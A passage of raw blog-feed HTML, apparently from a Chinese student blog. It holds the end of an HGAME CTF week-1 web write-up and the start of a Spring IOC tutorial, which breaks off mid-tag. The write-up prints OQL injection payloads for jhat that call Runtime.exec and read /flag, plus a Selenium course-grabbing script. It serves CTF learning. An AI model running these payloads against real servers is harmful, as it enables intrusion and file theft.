class="hljs-string">-6548</span> + 8724) + a : a,    t++ % (<span class="hljs-string">-268</span> * <span class="hljs-string">-25</span> + 166 * <span class="hljs-string">-37</span> + <span class="hljs-string">-277</span> * 2)) ? c += String[e(423)](7397 + 173 * 13 + 1 * <span class="hljs-string">-9391</span> &amp; r &gt;&gt; (<span class="hljs-string">-2</span> * t &amp; 1573 + <span class="hljs-string">-2423</span> * 1 + <span class="hljs-string">-856</span> * <span class="hljs-string">-1</span>)) : 3978 + <span class="hljs-string">-26</span> * 153)        a = n[e(481)](a);    return c&#125;</code></pre></div><p>那<code>n(439)</code>是什么</p><div class="code-wrapper"><pre><code class="hljs stylus">g<span class="hljs-selector-attr">[h(432)]</span><span class="hljs-selector-attr">[h(469)]</span> = <span class="hljs-built_in">function</span>(x) &#123;    <span class="hljs-selector-tag">var</span> n = h.....&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs abnf">var h <span class="hljs-operator">=</span> F<span class="hljs-comment">;</span></code></pre></div><p>把全部代码放入控制台后，输入<code>F</code>会发现是这个函数</p><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-variable">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params">x</span>, <span class="hljs-params">n</span>) &#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> $();    <span class="hljs-keyword">return</span> <span class="hljs-variable">F</span> <span class="hljs-operator">=</span> <span class="hljs-title function_">function</span>(<span class="hljs-params">t</span>, <span class="hljs-params">r</span>) &#123;        <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-variable">t</span> <span class="hljs-operator">-</span> (<span class="hljs-number">-4073</span> <span class="hljs-operator">*</span> <span class="hljs-number">1</span> <span class="hljs-operator">+</span> <span class="hljs-number">84</span> <span class="hljs-operator">*</span> <span class="hljs-number">-39</span> <span class="hljs-operator">+</span> <span class="hljs-number">7766</span>);        <span class="hljs-keyword">var</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-variable">e</span>[<span class="hljs-variable">t</span>];        <span class="hljs-keyword">return</span> <span class="hljs-variable">a</span>    &#125;    ,    <span class="hljs-title function_">F</span>(<span class="hljs-variable">x</span>, <span class="hljs-variable">n</span>)&#125;</code></pre></div><p>先把全部代码放入控制台(防止漏掉条件)，然后把上述条件（手动输入<code>var n = h</code>）都放入控制台</p><p><img src="/../images/HGAME-WEEK1/image-20240204230254471.png" alt="image-20240204230254471"></p><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a><strong>Bypass it</strong></h2><p>禁用js，访问register才能注册用户，然后登陆即可</p><h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><p>常规的HTTP请求头，不说了</p><h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><p>刚开始没思路，给了提示后做出来的</p><p>搜索发现jhat能够把内存一些东西放到7000端口的web服务上（附件给了开放端口）</p><p>就是一些内存的东西</p><p>然后发现一个OQL（类似于SQL的查询语句）</p><p>刚开始我以为要看文档，找到能够命令执行的函数什么的，然后就不会了</p><p>后来给了提示要RCE，我就查<code>OQL进行rce</code></p><p><a href="https://wooyun.js.org/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80)%E5%9C%A8%E4%BA%A7%E5%93%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%80%A0%E6%88%90%E7%9A%84RCE(Object%20Injection).html">https://wooyun.js.org/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80)%E5%9C%A8%E4%BA%A7%E5%93%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%80%A0%E6%88%90%E7%9A%84RCE(Object%20Injection).html</a></p><p>发现了这个文章，能够</p><div class="code-wrapper"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><p>就像OGNL和SPEL这样的写法</p><p>我当时做时已经给了不出网的提示，于是我就直接文件读取<code>/flag</code></p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">new</span> java.util.<span class="hljs-constructor">Scanner(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">io</span>.File(<span class="hljs-string">&quot;/flag&quot;</span>)</span>).next<span class="hljs-literal">()</span></code></pre></div><p><img src="/../images/HGAME-WEEK1/image-20240204231833889.png" alt="image-20240204231833889"></p><h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses *"></a><strong>Select Courses</strong> *</h2><p>。。。做不出来，没思路</p><p>唯一一个注入点就是POST个id，拿sqlmap跑没用</p><p>倒是能够在它渲染之前修改响应信息，使它显示成功选课</p><p>但最终那个fetch就是直接访问，也没带什么参数进行判断是否选课成功。。。</p><p>官方描述</p><blockquote><p>帮助阿菇选到所有课程，即可获取FLAG。后端逻辑是每间隔 30s-180s 放出⼀⻔课，若 5s 内没有选到</p><p>课程，则课程⼜会满员。已经被选上的课程不会再放出。当所有课程都选上之后，点击“选完了”按</p><p>钮，后端判定所有课程都已经被选择，就会返回给前端FLAG</p></blockquote><p>。。。。。。我就说咋有时候点开显示的是未满，然后又显示已满，还以为我眼花了呢</p><p>那没啥好说了</p><p>有意思的是用了selenium库，我看一些刷网课的代码也用这个</p><div class="code-wrapper"><pre><code class="hljs stylus">from selenium import webdriverfrom selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.by</span> import Byfrom selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.ui</span> import WebDriverWaitfrom selenium<span class="hljs-selector-class">.webdriver</span><span class="hljs-selector-class">.support</span> import expected_conditions as ECfrom <span class="hljs-selector-tag">time</span> import sleepdriver = webdriver<span class="hljs-selector-class">.Chrome</span>()driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)<span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>courses_list = <span class="hljs-selector-attr">[]</span><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):    course = &#123;        <span class="hljs-string">&#x27;panel&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;</span>,        <span class="hljs-string">&#x27;status&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;</span>,        <span class="hljs-string">&#x27;submit&#x27;</span>: f<span class="hljs-string">&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27;</span>    &#125;    courses_list<span class="hljs-selector-class">.append</span>(course)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(courses_list)</span></span>while courses_list:    driver<span class="hljs-selector-class">.refresh</span>()    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>)    <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> courses_list:        panel = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;panel&#x27;</span>]</span>)        panel<span class="hljs-selector-class">.click</span>()        status_element = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;status&#x27;</span>]</span>)        status_text = status_element<span class="hljs-selector-class">.text</span>        <span class="hljs-built_in">print</span>(status_text)        <span class="hljs-keyword">if</span> status_text != <span class="hljs-string">&quot;已满&quot;</span>:            submit_button = driver<span class="hljs-selector-class">.find_element</span>(By<span class="hljs-selector-class">.XPATH</span>, course<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;submit&#x27;</span>]</span>)            submit_button<span class="hljs-selector-class">.click</span>()            <span class="hljs-built_in">WebDriverWait</span>(driver, <span class="hljs-number">5</span>)<span class="hljs-selector-class">.until</span>(EC<span class="hljs-selector-class">.alert_is_present</span>())            alert = driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.alert</span>            alert<span class="hljs-selector-class">.accept</span>()            courses_list<span class="hljs-selector-class">.remove</span>(course)            break<span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>driver<span class="hljs-selector-class">.quit</span>()</code></pre></div><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>第一周就有点难，感觉又是个牛B的新生赛，毕竟是杭电啊</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2024/01/18/Spring/"/>
    <url>/2024/01/18/Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>spring是一个开源的容器</p><p>轻量级、非入侵的框架</p><p>控制反转(IOC) 和面向切面编程（AOP）</p><h2 id="IOC-控制反转-推导"><a href="#IOC-控制反转-推导" class="headerlink" title="IOC(控制反转)推导"></a>IOC(控制反转)推导</h2><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.zero.Dao;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserDao</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getUser</span><span class="hljs-params">()</span></span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.zero.Dao;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserDao</span></span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getUser</span><span class="hljs-params">()</span> </span>&#123;        System.out.println(<span class="hljs-string">&quot;获取默认数据&quot;</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.zero.Dao;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UsermysqlImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserDao</span></span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getUser</span><span class="hljs-params">()</span> </span>&#123;        System.out.println(<span class="hljs-string">&quot;mysql数据&quot;</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.zero.Dao;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserOracleImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserDao</span></span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getUser</span><span class="hljs-params">()</span> </span>&#123;        System.out.println(<span class="hljs-string">&quot;Oracle数据&quot;</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.zero.service;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getUser</span><span class="hljs-params">()</span></span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zero.service;<span class="hljs-keyword">import</span> com.zero.Dao.UserDao;<span class="hljs-keyword">import</span> com.zero.Dao.UserDaoImpl;<span class="hljs-keyword">import</span> com.zero.Dao.UserOracleImpl;<span class="hljs-keyword">import</span> com.zero.Dao.UsermysqlImpl;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-type">UserDao</span> <span class="hljs-variable">userDao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsermysqlImpl</span>();    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;        userDao.getUser();    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs smali">import com.zero.service.UserServiceImpl;<span class="hljs-keyword"></span><span class="hljs-keyword">public</span> class<span class="hljs-built_in"> execute </span>&#123;   <span class="hljs-keyword"> public</span><span class="hljs-keyword"> static</span> void main(String[] args) &#123;        UserServiceImpl userService =<span class="hljs-built_in"> new </span>UserServiceImpl();        userService.getUser();    &#125;&#125;</code></pre></div><p><img src="/../images/Spring/image-20240118234922520.png" alt="image-20240118234922520"></p><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.zero.service;<span class="hljs-keyword">import</span> com.zero.Dao.UserDao;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setUser</span><span class="hljs-params">(UserDao userDao)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getUser</span><span class="hljs-params">()</span></span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs typescript">package com.<span class="hljs-property">zero</span>.<span class="hljs-property">service</span>;<span class="hljs-keyword">import</span> com.<span class="hljs-property">zero</span>.<span class="hljs-property">Dao</span>.<span class="hljs-property">UserDao</span>;<span class="hljs-keyword">import</span> com.<span class="hljs-property">zero</span>.<span class="hljs-property">Dao</span>.<span class="hljs-property">UserDaoImpl</span>;<span class="hljs-keyword">import</span> com.<span class="hljs-property">zero</span>.<span class="hljs-property">Dao</span>.<span class="hljs-property">UserOracleImpl</span>;<span class="hljs-keyword">import</span> com.<span class="hljs-property">zero</span>.<span class="hljs-property">Dao</span>.<span class="hljs-property">UsermysqlImpl</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">UserDao</span> userDao;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setUser</span>(<span class="hljs-params">UserDao userDao</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">userDao</span> = userDao;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params"></span>) &#123;        userDao.<span class="hljs-title function_">getUser</span>();    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs smali">import com.zero.Dao.UserOracleImpl;import com.zero.service.UserServiceImpl;<span class="hljs-keyword"></span><span class="hljs-keyword">public</span> class<span class="hljs-built_in"> execute </span>&#123;   <span class="hljs-keyword"> public</span><span class="hljs-keyword"> static</span> void main(String[] args) &#123;        UserServiceImpl userService =<span class="hljs-built_in"> new </span>UserServiceImpl();        UserOracleImpl userOracle =<span class="hljs-built_in"> new </span>UserOracleImpl();        userService.setUser(userOracle);        userService.getUser();    &#125;&#125;</code></pre></div><p>使用set注入，控制权不在程序员手上，程序只能被动地接受对象</p><p>程序员不用再去管理对象的创建</p><p><img src="/../images/Spring/image-20240119164855097.png" alt="image-20240119164855097"></p><h2 id="HelloSpring"><a href="#HelloSpring" class="headerlink" title="HelloSpring"></a>HelloSpring</h2><p>通过xml配置文件修改</p><p>对象由spring来创建，管理、装配</p><div class="code-wrapper"><pre><code class="hljs typescript">package com.<span class="hljs-property">zero</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> str;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> str;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setStr</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> str</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">str</span> = str;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +                <span class="hljs-string">&quot;str=&#x27;&quot;</span> + str + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +                <span class="hljs-string">&#x27;&#125;&#x27;</span>;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mysql&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.Dao.UsermysqlImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;oracle&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.Dao.UserOracleImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;service&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.service.UserServiceImpl&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;mysql&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>   //这个name不是属性的名字，而是那个属性对应的set方法的名字，例如我这里set方法就是setUser    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;person&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.person&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;str&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.zero.Dao.UserOracleImpl;<span class="hljs-keyword">import</span> com.zero.person;<span class="hljs-keyword">import</span> com.zero.service.UserService;<span class="hljs-keyword">import</span> com.zero.service.UserServiceImpl;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">execute</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">classPathXmlApplicationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;bean.xml&quot;</span>);        <span class="hljs-type">UserService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> (UserService)classPathXmlApplicationContext.getBean(<span class="hljs-string">&quot;service&quot;</span>);        <span class="hljs-type">person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (person) classPathXmlApplicationContext.getBean(<span class="hljs-string">&quot;person&quot;</span>);        service.getUser();        System.out.println(person.toString());    &#125;&#125;</code></pre></div><h2 id="IOC有参构造创建对象方式"><a href="#IOC有参构造创建对象方式" class="headerlink" title="IOC有参构造创建对象方式"></a>IOC有参构造创建对象方式</h2><p>上面默认是无参构造实例化，那若是一个有参的构造函数呢</p><div class="code-wrapper"><pre><code class="hljs typescript">package com.<span class="hljs-property">zero</span>.<span class="hljs-property">pojo</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> user;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_">String</span> user) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = user;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +                <span class="hljs-string">&quot;user=&#x27;&quot;</span> + user + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +                <span class="hljs-string">&#x27;&#125;&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> user;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setUser</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> user</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = user;    &#125;&#125;</code></pre></div><p><img src="/../images/Spring/image-20240119173903265.png" alt="image-20240119173903265"></p><p>提示要使用<code>&lt;constructor-arg&gt;</code>标签</p><h3 id="方式一-通过类型-不推荐"><a href="#方式一-通过类型-不推荐" class="headerlink" title="方式一 通过类型 不推荐"></a>方式一 通过类型 不推荐</h3><p>这种方法有瑕疵，就是万一2个形参都是一样的类型就没办法了</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.zero.Dao.UserOracleImpl;<span class="hljs-keyword">import</span> com.zero.person;<span class="hljs-keyword">import</span> com.zero.pojo.<span class="hljs-keyword">User</span>;<span class="hljs-keyword">import</span> com.zero.service.UserService;<span class="hljs-keyword">import</span> com.zero.service.UserServiceImpl;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">execute</span> &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;        ApplicationContext classPathXmlApplicationContext = <span class="hljs-built_in">new</span> ClassPathXmlApplicationContext(&quot;bean.xml&quot;);        <span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span> = (<span class="hljs-keyword">User</span>) classPathXmlApplicationContext.getBean(&quot;user&quot;);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">user</span>.toString());    &#125;&#125;</code></pre></div><h3 id="方式二-下标索引"><a href="#方式二-下标索引" class="headerlink" title="方式二 下标索引"></a>方式二 下标索引</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="方式三-名字"><a href="#方式三-名字" class="headerlink" title="方式三 名字"></a>方式三 名字</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span 